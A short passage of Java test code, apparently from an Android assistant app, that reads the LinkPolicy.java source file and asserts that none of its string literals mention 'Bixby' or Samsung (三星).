         String lp = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/LinkPolicy.java").toPath()), "UTF-8");
         java.util.regex.Matcher lm = java.util.regex.Pattern.compile("\"([^\"\\\\]|\\\\.)*\"").matcher(lp);
         while (lm.find()) assertFalse(lm.group(), lm.group().contains("Bixby") || lm.group().contains("三星"));
